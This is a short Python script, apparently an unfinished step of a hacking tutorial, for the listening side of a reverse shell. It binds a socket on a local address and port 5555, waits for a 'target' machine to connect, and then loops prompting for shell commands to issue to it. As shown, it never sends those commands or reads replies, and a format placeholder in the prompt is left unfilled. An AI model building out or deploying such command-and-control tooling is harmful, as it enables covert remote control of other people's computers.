import socket


def target_communication():
	while True:
		command = input('* Shell~%s: ')


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.10.112', 5555))
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
